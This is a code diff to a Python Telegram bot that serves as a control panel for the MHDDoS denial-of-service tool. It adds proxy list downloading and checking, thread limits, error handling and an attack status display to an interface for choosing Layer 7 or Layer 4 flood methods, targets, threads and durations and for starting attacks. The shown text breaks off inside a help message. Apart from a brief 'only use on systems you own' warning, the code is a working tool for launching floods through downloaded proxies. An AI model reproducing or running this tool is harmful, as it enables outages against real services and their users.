@@ -9,19 +9,22 @@ Configure the bot token via environment variable TELEGRAM_BOT_TOKEN or config.js
 import asyncio
 import logging
 import os
+import resource
+import traceback
 from dataclasses import dataclass, field
 from enum import Enum, auto
 from json import JSONDecodeError, load
 from pathlib import Path
 from socket import gethostbyname
-from threading import Event, Thread
+from threading import Event, Thread, active_count
 from time import time
-from typing import Any, Dict, List, Optional
+from typing import Any, Dict, List, Optional, Tuple
 
 from icmplib import ping as icmp_ping
 from psutil import cpu_percent, net_io_counters, virtual_memory
 from requests import get as requests_get
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
+from telegram.error import TelegramError
 from telegram.ext import (
     Application,
     CallbackQueryHandler,
@@ -56,7 +59,56 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
+
+def get_max_threads() -> int:
+    """
+    Get the maximum number of threads allowed by the system.
+    This is important for platforms like Heroku with limited resources.
+    
+    Returns:
+        Maximum recommended thread count based on system limits
+    """
+    try:
+        # Try to get the soft limit for number of processes (RLIMIT_NPROC affects thread creation)
+        soft_limit, hard_limit = resource.getrlimit(resource.RLIMIT_NPROC)
+        
+        # Get current active threads
+        current_threads = active_count()
+        
+        # Calculate available threads (leave buffer for system)
+        if soft_limit == resource.RLIM_INFINITY:
+            # No specific limit, use a reasonable default
+            max_threads = 1000
+        else:
+            # Use 70% of available capacity
+            available = soft_limit - current_threads
+            max_threads = max(10, int(available * 0.7))
+        
+        logger.info(f"System thread limit: soft={soft_limit}, hard={hard_limit}, current={current_threads}, max_recommended={max_threads}")
+        return max_threads
+        
+    except (ValueError, OSError) as e:
+        logger.warning(f"Could not determine thread limit: {e}, using default 100")
+        return 100
+
+
+# Get system max threads on startup
+SYSTEM_MAX_THREADS = get_max_threads()
+
 __dir__ = Path(__file__).parent
+
+# Proxy type constants
+PROXY_HTTP = 1
+PROXY_SOCKS4 = 4
+PROXY_SOCKS5 = 5
+PROXY_ALL = 0
+PROXY_RANDOM = 6
+PROXY_NONE = -1
+
+
+class BotError(Exception):
+    """Custom exception for bot errors that should be shown to users."""
+    pass
 
 
 class ConversationState(Enum):
@@ -73,6 +125,7 @@ class ConversationState(Enum):
     CONFIRM_ATTACK = auto()
     TOOLS_MENU = auto()
     TOOLS_INPUT = auto()
+    PROXY_MANAGEMENT = auto()  # New state for proxy management
 
 
 @dataclass
@@ -116,6 +169,37 @@ class AttackConfig:
             proxy_type=self.proxy_type,
             is_layer7=self.is_layer7
         )
+    
+    def validate(self) -> Tuple[bool, str]:
+        """
+        Validate the attack configuration.
+        
+        Returns:
+            Tuple of (is_valid, error_message)
+        """
+        if not self.method:
+            return False, "Attack method not selected"
+        
+        if not self.target:
+            return False, "Target not specified"
+        
+        if self.threads < 1:
+            return False, "Thread count must be at least 1"
+        
+        if self.threads > SYSTEM_MAX_THREADS:
+            return False, f"Thread count exceeds system limit ({SYSTEM_MAX_THREADS}). Please use a lower value."
+        
+        if self.duration < 1:
+            return False, "Duration must be at least 1 second"
+        
+        if self.is_layer7:
+            if self.rpc < 1:
+                return False, "RPC must be at least 1"
+        else:
+            if not 1 <= self.port <= 65535:
+                return False, "Port must be between 1 and 65535"
+        
+        return True, ""
 
 
 @dataclass
@@ -127,6 +211,17 @@ class AttackSession:
     threads: List[Thread] = field(default_factory=list)
     is_running: bool = False
     monitor_task: Optional[asyncio.Task] = None
+    error_count: int = 0  # Track errors during attack
+    last_error: str = ""  # Last error message
+
+
+@dataclass
+class ProxyStats:
+    """Statistics about proxy files."""
+    http_count: int = 0
+    socks4_count: int = 0
+    socks5_count: int = 0
+    last_updated: float = 0
 
 
 def get_proxy_file_path(proxy_type: int) -> Path:
@@ -140,7 +235,88 @@ def get_proxy_file_path(proxy_type: int) -> Path:
     return __dir__ / f"files/proxies/{proxy_name}.txt"
 
 
-async def handle_proxy_list(proxy_type: int, threads: int = 100, url: Optional[URL] = None):
+def get_proxy_stats() -> ProxyStats:
+    """Get statistics about all proxy files."""
+    stats = ProxyStats()
+    
+    for ptype, name in [(1, "http"), (4, "socks4"), (5, "socks5")]:
+        path = get_proxy_file_path(ptype)
+        if path.exists():
+            try:
+                count = sum(1 for line in path.open() if line.strip())
+                if ptype == 1:
+                    stats.http_count = count
+                elif ptype == 4:
+                    stats.socks4_count = count
+                elif ptype == 5:
+                    stats.socks5_count = count
+                stats.last_updated = max(stats.last_updated, path.stat().st_mtime)
+            except Exception as e:
+                logger.error(f"Error reading proxy file {path}: {e}")
+    
+    return stats
+
+
+async def update_proxy_list(proxy_type: int, threads: int = 100, force: bool = False) -> Tuple[int, str]:
+    """
+    Update proxy list by downloading and checking new proxies.
+    
+    Args:
+        proxy_type: Proxy type (1=HTTP, 4=SOCKS4, 5=SOCKS5)
+        threads: Number of threads for proxy checking
+        force: Force update even if file exists
+    
+    Returns:
+        Tuple of (proxy_count, status_message)
+    """
+    from random import choice as randchoice
+    
+    if proxy_type not in {1, 4, 5}:
+        return 0, "Invalid proxy type. Use 1 (HTTP), 4 (SOCKS4), or 5 (SOCKS5)."
+    
+    proxy_li = get_proxy_file_path(proxy_type)
+    proxy_type_name = {1: "HTTP", 4: "SOCKS4", 5: "SOCKS5"}.get(proxy_type, "Unknown")
+    
+    try:
+        proxy_li.parent.mkdir(parents=True, exist_ok=True)
+        
+        # Download proxies from config providers
+        logger.info(f"Downloading {proxy_type_name} proxies...")
+        proxies = ProxyManager.DownloadFromConfig(con, proxy_type)
+        
+        if not proxies:
+            return 0, f"Failed to download {proxy_type_name} proxies. Check your internet connection."
+        
+        download_count = len(proxies)
+        logger.info(f"Downloaded {download_count:,} {proxy_type_name} proxies, checking...")
+        
+        # Check proxies
+        proxies = ProxyChecker.checkAll(
+            proxies, 
+            timeout=5, 
+            threads=min(threads, 100),  # Limit checker threads
+            url="http://httpbin.org/get",
+        )
+        
+        if not proxies:
+            return 0, f"No valid {proxy_type_name} proxies found after checking. Downloaded {download_count}, but none passed validation."
+        
+        # Save checked proxies to file
+        with proxy_li.open("w") as wr:
+            for proxy in proxies:
+                wr.write(str(proxy) + "\n")
+        
+        valid_count = len(proxies)
+        logger.info(f"Saved {valid_count:,} valid {proxy_type_name} proxies to file")
+        return valid_count, f"✓ {proxy_type_name}: Downloaded {download_count:,}, Valid: {valid_count:,}"
+        
+    except Exception as e:
+        error_msg = f"Failed to update {proxy_type_name} proxies: {str(e)}"
+        logger.error(error_msg)
+        return 0, error_msg
+
+
+async def handle_proxy_list(proxy_type: int, threads: int = 100, url: Optional[URL] = None) -> Tuple[Optional[set], str]:
     """
     Handle proxy list similar to CLI version.
     Downloads and checks proxies if file doesn't exist.
@@ -151,39 +327,43 @@ async def handle_proxy_list(proxy_type: int, threads: int = 100, url: Optional[U
         url: Target URL for proxy validation
     
     Returns:
-        Set of proxies or None
+        Tuple of (Set of proxies or None, status message)
     """
     from random import choice as randchoice
     
     if proxy_type not in {4, 5, 1, 0, 6}:
-        return None
+        return None, "Invalid proxy type"
     
     # Handle random proxy type
     if proxy_type == 6:
         proxy_type = randchoice([4, 5, 1])
     
     proxy_li = get_proxy_file_path(proxy_type)
+    proxy_type_name = {0: "All", 1: "HTTP", 4: "SOCKS4", 5: "SOCKS5"}.get(proxy_type, "Unknown")
     
     if not proxy_li.exists():
-        logger.info("Proxy file doesn't exist, downloading proxies...")
+        logger.info(f"Proxy file doesn't exist, downloading {proxy_type_name} proxies...")
         proxy_li.parent.mkdir(parents=True, exist_ok=True)
         
         try:
             # Download proxies from config providers
             proxies = ProxyManager.DownloadFromConfig(con, proxy_type)
-            logger.info(f"Downloaded {len(proxies):,} proxies, checking...")
+            if not proxies:
+                return None, f"Failed to download {proxy_type_name} proxies"
+                
+            download_count = len(proxies)
+            logger.info(f"Downloaded {download_count:,} proxies, checking...")
             
             # Check proxies
             proxies = ProxyChecker.checkAll(
                 proxies, 
                 timeout=5, 
-                threads=threads,
+                threads=min(threads, 100),
                 url=url.human_repr() if url else "http://httpbin.org/get",
             )
             
             if not proxies:
-                logger.warning("No valid proxies found after checking")
-                return None
+                return None, f"No valid {proxy_type_name} proxies found after checking ({download_count} downloaded)"
             
             # Save checked proxies to file
             with proxy_li.open("w") as wr:
@@ -191,21 +371,25 @@ async def handle_proxy_list(proxy_type: int, threads: int = 100, url: Optional[U
                     wr.write(str(proxy) + "\n")
             
             logger.info(f"Saved {len(proxies):,} valid proxies to file")
-            return proxies
+            return proxies, f"Downloaded and validated {len(proxies):,} {proxy_type_name} proxies"
             
         except Exception as e:
-            logger.error(f"Failed to download/check proxies: {str(e)}")
-            return None
+            error_msg = f"Failed to download/check proxies: {str(e)}"
+            logger.error(error_msg)
+            return None, error_msg
     
     # Read existing proxies from file
-    proxies = ProxyUtiles.readFromFile(proxy_li)
-    if proxies:
-        logger.info(f"Loaded {len(proxies):,} proxies from file")
-    else:
-        logger.warning("Empty proxy file")
-        proxies = None
-    
-    return proxies
+    try:
+        proxies = ProxyUtiles.readFromFile(proxy_li)
+        if proxies:
+            logger.info(f"Loaded {len(proxies):,} proxies from file")
+            return proxies, f"Loaded {len(proxies):,} {proxy_type_name} proxies"
+        else:
+            return None, f"Empty proxy file for {proxy_type_name}"
+    except Exception as e:
+        error_msg = f"Failed to read proxy file: {str(e)}"
+        logger.error(error_msg)
+        return None, error_msg
 
 
 class MHDDoSBot:
@@ -217,6 +401,7 @@ class MHDDoSBot:
         self.user_configs: Dict[int, AttackConfig] = {}
         self.active_sessions: Dict[int, AttackSession] = {}
         self.user_tools_context: Dict[int, str] = {}
+        self.user_state_context: Dict[int, str] = {}  # Track which state user is in for text input
         
     def get_user_config(self, user_id: int) -> AttackConfig:
         """Get or create user configuration."""
@@ -230,19 +415,53 @@ class MHDDoSBot:
             return True
         return user_id in self.allowed_users
     
+    async def send_error(self, update: Update, error_msg: str, show_menu: bool = True) -> None:
+        """Send error message to user with optional main menu."""
+        text = f"⚠️ Error: {error_msg}"
+        keyboard = self.get_main_menu_keyboard() if show_menu else None
+        
+        try:
+            if update.callback_query:
+                await update.callback_query.edit_message_text(text, reply_markup=keyboard)
+            elif update.message:
+                await update.message.reply_text(text, reply_markup=keyboard)
+        except TelegramError as e:
+            logger.error(f"Failed to send error message: {e}")
+    
+    async def safe_edit_message(self, query, text: str, reply_markup=None) -> bool:
+        """Safely edit a message, handling Telegram API errors."""
+        try:
+            await query.edit_message_text(text, reply_markup=reply_markup)
+            return True
+        except TelegramError as e:
+            logger.error(f"Failed to edit message: {e}")
+            return False
+    
+    async def safe_reply(self, message, text: str, reply_markup=None) -> bool:
+        """Safely reply to a message, handling Telegram API errors."""
+        try:
+            await message.reply_text(text, reply_markup=reply_markup)
+            return True
+        except TelegramError as e:
+            logger.error(f"Failed to send reply: {e}")
+            return False
+    
     # Keyboard generators
     def get_main_menu_keyboard(self) -> InlineKeyboardMarkup:
         """Generate main menu keyboard."""
         keyboard = [
             [
-                InlineKeyboardButton("Layer 7 Attack", callback_data="layer_7"),
-                InlineKeyboardButton("Layer 4 Attack", callback_data="layer_4"),
+                InlineKeyboardButton("🔥 Layer 7", callback_data="layer_7"),
+                InlineKeyboardButton("💥 Layer 4", callback_data="layer_4"),
             ],
             [
-                InlineKeyboardButton("Tools", callback_data="tools"),
-                InlineKeyboardButton("Status", callback_data="status"),
+                InlineKeyboardButton("🔧 Tools", callback_data="tools"),
+                InlineKeyboardButton("📊 Status", callback_data="status"),
             ],
-            [InlineKeyboardButton("Help", callback_data="help")],
+            [
+                InlineKeyboardButton("🔄 Proxy Manager", callback_data="proxy_manager"),
+            ],
+            [InlineKeyboardButton("❓ Help", callback_data="help")],
         ]
         return InlineKeyboardMarkup(keyboard)
     
@@ -291,26 +510,37 @@ class MHDDoSBot:
                 InlineKeyboardButton("All Types", callback_data="proxy_0"),
                 InlineKeyboardButton("No Proxy", callback_data="proxy_none"),
             ],
-            [InlineKeyboardButton("Back", callback_data="back_main")],
+            [InlineKeyboardButton("⬅️ Back", callback_data="back_main")],
         ]
         return InlineKeyboardMarkup(keyboard)
     
     def get_threads_keyboard(self) -> InlineKeyboardMarkup:
-        """Generate thread count selection keyboard."""
-        keyboard = [
-            [
-                InlineKeyboardButton("50", callback_data="threads_50"),
-                InlineKeyboardButton("100", callback_data="threads_100"),
-                InlineKeyboardButton("200", callback_data="threads_200"),
-            ],
-            [
-                InlineKeyboardButton("500", callback_data="threads_500"),
-                InlineKeyboardButton("1000", callback_data="threads_1000"),
-                InlineKeyboardButton("Custom", callback_data="threads_custom"),
-            ],
-            [InlineKeyboardButton("Back", callback_data="back_main")],
-        ]
+        """Generate thread count selection keyboard with system limits."""
+        # Dynamically adjust buttons based on system limit
+        max_threads = SYSTEM_MAX_THREADS
+        
+        options = [50, 100, 200, 500, 1000]
+        # Filter options that exceed system limit
+        valid_options = [o for o in options if o <= max_threads]
+        
+        keyboard = []
+        row = []
+        for opt in valid_options:
+            row.append(InlineKeyboardButton(str(opt), callback_data=f"threads_{opt}"))
+            if len(row) == 3:
+                keyboard.append(row)
+                row = []
+        
+        if row:
+            keyboard.append(row)
+        
+        keyboard.append([InlineKeyboardButton("Custom", callback_data="threads_custom")])
+        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data="back_main")])
         return InlineKeyboardMarkup(keyboard)
+    
+    def get_threads_prompt(self) -> str:
+        """Get the threads prompt message with system limit info."""
+        return f"Select thread count:\n\n⚠️ System max threads: {SYSTEM_MAX_THREADS}\n(Based on current system limits)"
     
     def get_duration_keyboard(self) -> InlineKeyboardMarkup:
         """Generate duration selection keyboard."""
@@ -325,7 +555,7 @@ class MHDDoSBot:
                 InlineKeyboardButton("600s", callback_data="duration_600"),
                 InlineKeyboardButton("Custom", callback_data="duration_custom"),
             ],
-            [InlineKeyboardButton("Back", callback_data="back_main")],
+            [InlineKeyboardButton("⬅️ Back", callback_data="back_main")],
         ]
         return InlineKeyboardMarkup(keyboard)
     
@@ -342,7 +572,7 @@ class MHDDoSBot:
                 InlineKeyboardButton("100", callback_data="rpc_100"),
                 InlineKeyboardButton("Custom", callback_data="rpc_custom"),
             ],
-            [InlineKeyboardButton("Back", callback_data="back_main")],
+            [InlineKeyboardButton("⬅️ Back", callback_data="back_main")],
         ]
         return InlineKeyboardMarkup(keyboard)
     
@@ -350,8 +580,8 @@ class MHDDoSBot:
         """Generate confirmation keyboard."""
         keyboard = [
             [
-                InlineKeyboardButton("Start Attack", callback_data="confirm_start"),
-                InlineKeyboardButton("Cancel", callback_data="confirm_cancel"),
+                InlineKeyboardButton("✅ Start Attack", callback_data="confirm_start"),
+                InlineKeyboardButton("❌ Cancel", callback_data="confirm_cancel"),
             ],
         ]
         return InlineKeyboardMarkup(keyboard)
@@ -360,25 +590,44 @@ class MHDDoSBot:
         """Generate tools menu keyboard."""
         keyboard = [
             [
-                InlineKeyboardButton("INFO", callback_data="tool_info"),
-                InlineKeyboardButton("PING", callback_data="tool_ping"),
+                InlineKeyboardButton("🌐 INFO", callback_data="tool_info"),
+                InlineKeyboardButton("📡 PING", callback_data="tool_ping"),
             ],
             [
-                InlineKeyboardButton("CHECK", callback_data="tool_check"),
-                InlineKeyboardButton("DSTAT", callback_data="tool_dstat"),
+                InlineKeyboardButton("✔️ CHECK", callback_data="tool_check"),
+                InlineKeyboardButton("📊 DSTAT", callback_data="tool_dstat"),
             ],
             [
-                InlineKeyboardButton("TSSRV", callback_data="tool_tssrv"),
+                InlineKeyboardButton("🎮 TSSRV", callback_data="tool_tssrv"),
             ],
-            [InlineKeyboardButton("Back", callback_data="back_main")],
+            [InlineKeyboardButton("⬅️ Back", callback_data="back_main")],
+        ]
+        return InlineKeyboardMarkup(keyboard)
+    
+    def get_proxy_manager_keyboard(self) -> InlineKeyboardMarkup:
+        """Generate proxy manager keyboard."""
+        keyboard = [
+            [
+                InlineKeyboardButton("📋 View Stats", callback_data="proxy_stats"),
+            ],
+            [
+                InlineKeyboardButton("🔄 Update HTTP", callback_data="proxy_update_1"),
+                InlineKeyboardButton("🔄 Update SOCKS4", callback_data="proxy_update_4"),
+            ],
+            [
+                InlineKeyboardButton("🔄 Update SOCKS5", callback_data="proxy_update_5"),
+                InlineKeyboardButton("🔄 Update All", callback_data="proxy_update_all"),
+            ],
+            [InlineKeyboardButton("⬅️ Back", callback_data="back_main")],
         ]
         return InlineKeyboardMarkup(keyboard)
     
     def get_stop_keyboard(self) -> InlineKeyboardMarkup:
         """Generate stop attack keyboard."""
         keyboard = [
-            [InlineKeyboardButton("Stop Attack", callback_data="stop_attack")],
-            [InlineKeyboardButton("Back to Menu", callback_data="back_main")],
+            [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")],
+            [InlineKeyboardButton("🔄 Refresh Status", callback_data="refresh_status")],
+            [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back_main")],
         ]
         return InlineKeyboardMarkup(keyboard)
     
@@ -388,199 +637,362 @@ class MHDDoSBot:
         proxy_names = {0: "All", 1: "HTTP", 4: "SOCKS4", 5: "SOCKS5", 6: "Random", -1: "None"}
         proxy = proxy_names.get(config.proxy_type, str(config.proxy_type))
         
+        # Add warning if threads exceed recommended limit
+        thread_warning = ""
+        if config.threads > SYSTEM_MAX_THREADS * 0.8:
+            thread_warning = f"\n⚠️ High thread count (limit: {SYSTEM_MAX_THREADS})"
+        
         summary = f"""
-Attack Configuration:
----------------------
-Layer: {layer}
-Method: {config.method}
-Target: {config.target}
-Port: {config.port}
-Threads: {config.threads}
-Duration: {config.duration}s"""
+📋 Attack Configuration:
+------------------------
+🎯 Layer: {layer}
+⚡ Method: {config.method}
+🌐 Target: {config.target}
+🔌 Port: {config.port}
+🧵 Threads: {config.threads}{thread_warning}
+⏱️ Duration: {config.duration}s"""
         
         if config.is_layer7:
             summary += f"""
-RPC: {config.rpc}
-Proxy Type: {proxy}"""
+🔄 RPC: {config.rpc}
+🔒 Proxy Type: {proxy}"""
         
         return summary
     
     # Command handlers
     async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         """Handle /start command."""
-        user_id = update.effective_user.id
-        
-        if not self.is_authorized(user_id):
-            await update.message.reply_text("You are not authorized to use this bot.")
-            return ConversationHandler.END
-        
-        self.get_user_config(user_id).reset()
-        
-        welcome_text = """
-MHDDoS Telegram Bot Interface
+        try:
+            user_id = update.effective_user.id
+            
+            if not self.is_authorized(user_id):
+                await update.message.reply_text("⛔ You are not authorized to use this bot.")
+                return ConversationHandler.END
+            
+            self.get_user_config(user_id).reset()
+            self.user_state_context[user_id] = ""
+            
+            welcome_text = f"""
+🚀 MHDDoS Telegram Bot Interface
 
 Select an option from the menu below to begin.
 
-Warning: Only use this tool on systems you own or have explicit permission to test.
+ℹ️ System Info:
+• Max Threads: {SYSTEM_MAX_THREADS}
+• Active Threads: {active_count()}
+
+⚠️ Warning: Only use this tool on systems you own or have explicit permission to test.
 """
-        await update.message.reply_text(
-            welcome_text,
-            reply_markup=self.get_main_menu_keyboard()
-        )
-        return ConversationState.MAIN_MENU.value
+            await update.message.reply_text(
+                welcome_text,
+                reply_markup=self.get_main_menu_keyboard()
+            )
+            return ConversationState.MAIN_MENU.value
+        except Exception as e:
+            logger.error(f"Error in start_command: {e}\n{traceback.format_exc()}")
+            await self.safe_reply(update.message, f"⚠️ Error starting bot: {str(e)}")
+            return ConversationHandler.END
     
     async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         """Handle /help command."""
-        help_text = """
-MHDDoS Bot Commands:
+        help_text = f"""
+📖 MHDDoS Bot Commands:
 
 /start - Start the bot and show main menu
 /help - Show this help message
 /status - Show current attack status
 /stop - Stop all running attacks
 
-Navigation:
-- Use inline buttons to navigate
-- Select attack layer (L4/L7)
-- Choose attack method
-- Configure parameters
-- Confirm and start attack
+🎮 Navigation:
+• Use inline buttons to navigate
+• Select attack layer (L4/L7)
+• Choose attack method
+• Configure parameters
+• Confirm and start attack
 
-Layer 7 Methods: HTTP-based attacks
-Layer 4 Methods: TCP/UDP-based attacks
+🔥 Layer 7 Methods: HTTP-based attacks
+💥 Layer 4 Methods: TCP/UDP-based attacks
 
-Tools:
-- INFO: Get IP information
-- PING: Ping target
-- CHECK: Check website status
-- DSTAT: Network statistics
-- TSSRV: TeamSpeak SRV resolver
+🔧 Tools:
+• INFO: Get IP information
+• PING: Ping target
+• CHECK: Check website status
+• DSTAT: Network statistics
+• TSSRV: TeamSpeak SRV resolver
+
+🔄 Proxy Manager:
+• View proxy statistics
+• Update/refresh proxy lists
+
+⚙️ System Limits:
+• Max Threads: {SYSTEM_MAX_THREADS}
 """
         await update.message.reply_text(help_text)
     
     async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         """Handle /status command."""
-        user_id = update.effective_user.id
-        
-        if user_id not in self.active_sessions:
-            await update.message.reply_text("No active attacks.")
-            return
-        
-        session = self.active_sessions[user_id]
-        if not session.is_running:
-            await update.message.reply_text("No active attacks.")
-            return
-        
-        elapsed = int(time() - session.start_time)
-        remaining = max(0, session.config.duration - elapsed)
-        
-        status_text = f"""
-Attack Status:
--------------
-Target: {session.config.target}
-Method: {session.config.method}
-Elapsed: {elapsed}s
-Remaining: {remaining}s
-PPS: {Tools.humanformat(int(REQUESTS_SENT))}
-BPS: {Tools.humanbytes(int(BYTES_SEND))}
+        try:
+            user_id = update.effective_user.id
+            
+            if user_id not in self.active_sessions:
+                await update.message.reply_text("📭 No active attacks.", reply_markup=self.get_main_menu_keyboard())
+                return
+            
+            session = self.active_sessions[user_id]
+            if not session.is_running:
+                await update.message.reply_text("📭 No active attacks.", reply_markup=self.get_main_menu_keyboard())
+                return
+            
+            elapsed = int(time() - session.start_time)
+            remaining = max(0, session.config.duration - elapsed)
+            progress = min(100, int((elapsed / session.config.duration) * 100))
+            progress_bar = "█" * (progress // 10) + "░" * (10 - progress // 10)
+            
+            error_info = ""
+            if session.error_count > 0:
+                error_info = f"\n⚠️ Errors: {session.error_count}"
+                if session.last_error:
+                    error_info += f"\n📛 Last: {session.last_error[:50]}"
+            
+            status_text = f"""
+📊 Attack Status:
+-----------------
+🎯 Target: {session.config.target}
+⚡ Method: {session.config.method}
+⏱️ Elapsed: {elapsed}s
+⏳ Remaining: {remaining}s
+📈 Progress: [{progress_bar}] {progress}%
+📤 PPS: {Tools.humanformat(int(REQUESTS_SENT))}
+📦 BPS: {Tools.humanbytes(int(BYTES_SEND))}{error_info}
 """
-        await update.message.reply_text(
-            status_text,
-            reply_markup=self.get_stop_keyboard()
-        )
+            await update.message.reply_text(
+                status_text,
+                reply_markup=self.get_stop_keyboard()
+            )
+        except Exception as e:
+            logger.error(f"Error in status_command: {e}\n{traceback.format_exc()}")
+            await self.safe_reply(update.message, f"⚠️ Error getting status: {str(e)}")
     
     async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         """Handle /stop command."""
-        user_id = update.effective_user.id
-        
-        if user_id in self.active_sessions:
-            session = self.active_sessions[user_id]
-            session.event.clear()
-            session.is_running = False
-            del self.active_sessions[user_id]
-            await update.message.reply_text("Attack stopped.")
-        else:
-            await update.message.reply_text("No active attacks to stop.")
+        try:
+            user_id = update.effective_user.id
+            
+            if user_id in self.active_sessions:
+                session = self.active_sessions[user_id]
+                session.event.clear()
+                session.is_running = False
+                if session.monitor_task and not session.monitor_task.done():
+                    session.monitor_task.cancel()
+                del self.active_sessions[user_id]
+                await update.message.reply_text("🛑 Attack stopped.", reply_markup=self.get_main_menu_keyboard())
+            else:
+                await update.message.reply_text("📭 No active attacks to stop.", reply_markup=self.get_main_menu_keyboard())
+        except Exception as e:
+            logger.error(f"Error in stop_command: {e}\n{traceback.format_exc()}")
+            await self.safe_reply(update.message, f"⚠️ Error stopping attack: {str(e)}")
     
     # Callback query handlers
     async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
         """Handle button callbacks."""
         query = update.callback_query
-        await query.answer()
-        
         user_id = update.effective_user.id
+        
+        try:
+            await query.answer()
+        except TelegramError:
+            pass  # Answer may have expired
+        
         if not self.is_authorized(user_id):
-            await query.edit_message_text("You are not authorized to use this bot.")
+            await self.safe_edit_message(query, "⛔ You are not authorized to use this bot.")
             return ConversationHandler.END
         
         config = self.get_user_config(user_id)
         data = query.data
         
+        try:
+            return await self._process_callback(query, user_id, config, data)
+        except Exception as e:
+            logger.error(f"Error in button_callback: {e}\n{traceback.format_exc()}")
+            await self.safe_edit_message(
+                query,
+                f"⚠️ Error: {str(e)}\n\nReturning to main menu...",
+                reply_markup=self.get_main_menu_keyboard()
+            )
+            return ConversationState.MAIN_MENU.value
+    
+    async def _process_callback(self, query, user_id: int, config: AttackConfig, data: str) -> int:
+        """Process callback data. Separated for better error handling."""
+        
         # Main menu selections
         if data == "layer_7":
             config.is_layer7 = True
-            await query.edit_message_text(
-                "Select Layer 7 Method:",
+            await self.safe_edit_message(
+                query,
+                "🔥 Select Layer 7 Method:",
                 reply_markup=self.get_layer7_methods_keyboard()
             )
             return ConversationState.SELECT_METHOD.value
         
         elif data == "layer_4":
             config.is_layer7 = False
-            await query.edit_message_text(
-                "Select Layer 4 Method:",
+            await self.safe_edit_message(
+                query,
+                "💥 Select Layer 4 Method:",
                 reply_markup=self.get_layer4_methods_keyboard()
             )
             return ConversationState.SELECT_METHOD.value
         
         elif data == "tools":
-            await query.edit_message_text(
-                "Select a tool:",
+            await self.safe_edit_message(
+                query,
+                "🔧 Select a tool:",
                 reply_markup=self.get_tools_keyboard()
             )
             return ConversationState.TOOLS_MENU.value
         
-        elif data == "status":
+        elif data == "proxy_manager":
+            stats = get_proxy_stats()
+            from datetime import datetime
+            last_update = datetime.fromtimestamp(stats.last_updated).strftime('%Y-%m-%d %H:%M') if stats.last_updated else "Never"
+            
+            stats_text = f"""
+🔄 Proxy Manager
+----------------
+📊 Current Proxy Counts:
+• HTTP: {stats.http_count:,}
+• SOCKS4: {stats.socks4_count:,}
+• SOCKS5: {stats.socks5_count:,}
+• Total: {stats.http_count + stats.socks4_count + stats.socks5_count:,}
+
+🕐 Last Updated: {last_update}
+
+Select an option to manage proxies:
+"""
+            await self.safe_edit_message(
+                query,
+                stats_text,
+                reply_markup=self.get_proxy_manager_keyboard()
+            )
+            return ConversationState.PROXY_MANAGEMENT.value
+        
+        elif data == "proxy_stats":
+            stats = get_proxy_stats()
+            from datetime import datetime
+            last_update = datetime.fromtimestamp(stats.last_updated).strftime('%Y-%m-%d %H:%M') if stats.last_updated else "Never"
+            
+            stats_text = f"""
+📊 Proxy Statistics
+-------------------
+• HTTP Proxies: {stats.http_count:,}
+• SOCKS4 Proxies: {stats.socks4_count:,}
+• SOCKS5 Proxies: {stats.socks5_count:,}
+• Total Proxies: {stats.http_count + stats.socks4_count + stats.socks5_count:,}
+
+🕐 Last Updated: {last_update}
+"""
+            await self.safe_edit_message(
+                query,
+                stats_text,
+                reply_markup=self.get_proxy_manager_keyboard()
+            )
+            return ConversationState.PROXY_MANAGEMENT.value
+        
+        elif data.startswith("proxy_update_"):
+            proxy_type_str = data.replace("proxy_update_", "")
+            
+            if proxy_type_str == "all":
+                await self.safe_edit_message(query, "🔄 Updating all proxy lists... This may take a few minutes.")
+                
+                results = []
+                for ptype in [1, 4, 5]:
+                    count, msg = await update_proxy_list(ptype)
+                    results.append(msg)
+                
+                result_text = "📋 Proxy Update Results:\n\n" + "\n".join(results)
+                await self.safe_edit_message(
+                    query,
+                    result_text,
+                    reply_markup=self.get_proxy_manager_keyboard()
+                )
+            else:
+                proxy_type = int(proxy_type_str)
+                type_name = {1: "HTTP", 4: "SOCKS4", 5: "SOCKS5"}.get(proxy_type, "Unknown")
+                
+                await self.safe_edit_message(query, f"🔄 Updating {type_name} proxies... This may take a minute.")
+                
+                count, msg = await update_proxy_list(proxy_type)
+                
+                await self.safe_edit_message(
+                    query,
+                    f"📋 Update Result:\n\n{msg}",
+                    reply_markup=self.get_proxy_manager_keyboard()
+                )
+            
+            return ConversationState.PROXY_MANAGEMENT.value
+        
+        elif data == "status" or data == "refresh_status":
             if user_id not in self.active_sessions or not self.active_sessions[user_id].is_running:
-                await query.edit_message_text(
-                    "No active attacks.",
+                await self.safe_edit_message(
+                    query,
+                    "📭 No active attacks.",
                     reply_markup=self.get_main_menu_keyboard()
                 )
             else:
                 session = self.active_sessions[user_id]
                 elapsed = int(time() - session.start_time)
                 remaining = max(0, session.config.duration - elapsed)
+                progress = min(100, int((elapsed / session.config.duration) * 100))
+                progress_bar = "█" * (progress // 10) + "░" * (10 - progress // 10)
+                
+                error_info = ""
+                if session.error_count > 0:
+                    error_info = f"\n⚠️ Errors: {session.error_count}"
+                    if session.last_error:
+                        error_info += f"\n📛 Last: {session.last_error[:50]}"
+                
                 status_text = f"""
-Attack Status:
--------------
-Target: {session.config.target}
-Method: {session.config.method}
-Elapsed: {elapsed}s
-Remaining: {remaining}s
+📊 Attack Status:
+-----------------
+🎯 Target: {session.config.target}
+⚡ Method: {session.config.method}
+⏱️ Elapsed: {elapsed}s
+⏳ Remaining: {remaining}s
+📈 Progress: [{progress_bar}] {progress}%
+📤 PPS: {Tools.humanformat(int(REQUESTS_SENT))}
+📦 BPS: {Tools.humanbytes(int(BYTES_SEND))}{error_info}
 """
-                await query.edit_message_text(
+                await self.safe_edit_message(
+                    query,
                     status_text,
                     reply_markup=self.get_stop_keyboard()
                 )
             return ConversationState.MAIN_MENU.value
         
         elif data == "help":
-            help_text = """
-MHDDoS Bot Help:
+            help_text = f"""
+📖 MHDDoS Bot Help:
 
-Layer 7 Methods: HTTP-based attacks
-- GET, POST, CFB, BYPASS, OVH, etc.
+🔥 Layer 7 Methods: HTTP-based attacks
+• GET, POST, CFB, BYPASS, OVH, etc.
 
-Layer 4 Methods: TCP/UDP-based attacks
